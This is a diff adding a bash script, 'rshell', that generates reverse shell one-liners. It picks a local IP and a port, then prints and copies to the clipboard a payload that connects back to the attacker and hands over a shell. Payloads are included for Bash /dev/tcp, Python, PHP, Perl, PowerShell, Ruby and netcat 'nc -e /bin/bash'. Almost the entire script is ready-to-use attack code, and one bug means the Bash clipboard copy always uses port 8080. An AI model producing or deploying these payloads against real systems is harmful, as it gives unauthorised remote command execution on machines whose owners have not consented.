@@ -1,0 +1,199 @@
+#!/bin/bash
+
+
+#Colores
+greenColour="\e[0;32m\033[1m"
+endColour="\033[0m\e[0m"
+redColour="\e[0;31m\033[1m"
+blueColour="\e[0;34m\033[1m"
+yellowColour="\e[0;33m\033[1m"
+purpleColour="\e[0;35m\033[1m"
+turquoiseColour="\e[0;36m\033[1m"
+grayColour="\e[0;37m\033[1m"
+
+
+function interface(){
+
+lineas=$(ifconfig| grep "inet" | cut -d " " -f10 | grep -Ev "[:a-zA-Z]" | grep -v 127 | wc -l) #numero de interfaces
+
+int=$(ifconfig| grep "inet" | cut -d " " -f10 | grep -Ev "[:a-zA-Z]" | grep -v 127) #interfaz
+
+cont=1
+
+a=$(echo "$int")
+
+c=$(while [ "$cont" -le "$lineas" ]; do
+	for i in $(echo "$a"); do
+	echo  "$cont)" $i
+	let cont=$cont+1
+	done
+done)
+
+echo "$c" | cut -d " " -f1,2
+
+read -p "Select an option: " ip
+
+ip=$(echo "$c" | grep "$ip)" | cut -d " " -f 2)
+
+read -p "Port: " port
+
+}
+
+########### Lenguajes #########
+
+function bash() {
+
+echo ""
+echo -e "                          ${redColour}BASH ${endColour}"
+interface
+echo -e "${yellowColour}bash -i >& /dev/tcp/$ip/$port 0>&1 ${normalColour}"
+echo "bash -i >& /dev/tcp/$ip/8080 0>&1" | xclip -sel clip
+
+echo -e "${greenColour}Rev-Shell copied to clipboard ${normalColour}"
+exit 0
+}
+
+
+function python(){
+
+echo ""
+echo -e "                           ${redColour}PYTHON ${endColour}"
+interface
+echo -e "${yellowColour}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'${endColour}"
+echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'" | xclip -sel clip
+
+echo -e "${greenColour}Rev-Shell copied to clipboard ${normalColour}"
+exit 0
+}
+
+function php(){
+
+echo ""
+echo -e "                         ${redColour}PHP ${endColour}"
+interface
+echo -e "${yellowColour}php -r '$sock=fsockopen("$ip",$port);exec("/bin/sh -i \<\&3 \>\&3 2\>\&3");'${endColour}"
+echo "php -r '$sock=fsockopen("$ip",$port);exec("/bin/sh -i \<\&3 \>\&3 2\>\&3");'" | xclip -sel clip
+
+echo -e "${greenColour}Rev-Shell copied to clipboard ${normalColour}"
+exit 0
+}
+
+function perl(){
+echo ""
+echo -e "                          ${redColour}PERL ${endColour}"
+interface
+echo -e "perl -e 'use Socket;$i="$ip";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"\>\&S");open(STDOUT,"\>\&S");open(STDERR,"\>\&S");exec("/bin/sh -i");};'"
+echo "perl -e 'use Socket;$i="$ip";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"\>\&S");open(STDOUT,"\>\&S");open(STDERR,"\>\&S");exec("/bin/sh -i");};'" | xclip -sel clip
+
+echo -e "${greenColour}Rev-Shell copied to clipboard ${normalColour}"
+exit 0
+}
+
+function powershell(){
+echo ""
+echo -e "                         ${redColour}POWERSHELL ${endColour}"
+interface
+echo -e "${yellowColour}"powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"${endColour}
+echo powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" | xclip -sel clip
+echo -e "${greenColour}Rev-Shell copied to clipboard ${normalColour}"
+exit 0
+}
+
+function ruby(){
+
+
+echo ""
+echo -e "                         ${redColour}RUBY ${endColour}"
+interface
+
+echo -e "${yellowColour}ruby -rsocket -e'f=TCPSocket.open("$ip",$port).to_i;exec sprintf("/bin/sh -i \<\&\%d \>\&\%d 2\>\&\%d",f,f,f)'${endColour}"
+echo "ruby -rsocket -e'f=TCPSocket.open("$ip",$port).to_i;exec sprintf("/bin/sh -i \<\&\%d \>\&\%d 2\>\&\%d",f,f,f)'" | xclip -sel clip
+
+echo -e "${greenColour}Rev-Shell copied to clipboard ${normalColour}"
+exit 0
+}
+
+
+function netcat(){
+echo ""
+echo -e "                         ${redColour}NETCAT ${endColour}"
+interface
+echo -e "${yellowColour}nc -e /bin/bash $ip $port${endColour}"
+echo "nc -e /bin/bash $ip $port" | xclip -sel clip
+
+echo -e "${greenColour}Rev-Shell copied to clipboard ${normalColour}"
+exit 0
+}
+
+function init(){
+
+echo "Usage: rshell <language>"
+echo ""
+echo -e "${turquoiseColour}Languages:${endColour} "
+echo "Bash"
+echo "Python"
+echo "Php"
+echo "Perl"
+echo "Powershell"
+echo "Netcat"
+echo "Ruby"
+exit 0
+
+}
+
+######## Main ########
+
+if [[ $# -eq 0 || "$1" == "-h" ]]; then
+
+	init
+
+fi
+
+
+arg=$(echo "$1" |tr '[:upper:]' '[:lower:]')
+
+
+if [ "$arg" == "bash" ]; then
+
+	bash
+
+fi
+
+
+if [ "$arg" == "python" ]; then
+
+	python
+
+fi
+
+
+if [ "$arg" == "php" ]; then
+
+	php
+
+fi
+
+if [ "$arg" == "perl" ]; then
+
+	perl
+
+fi
+
+if [ "$arg" == "ruby" ]; then
+
+	ruby
+
+fi
+
+if [ "$arg" == "netcat" ]; then
+
+	netcat
+
+fi
+
+if [ "$arg" == "powershell" ]; then
+
+	powershell
+
+fi
+##### Dot #####
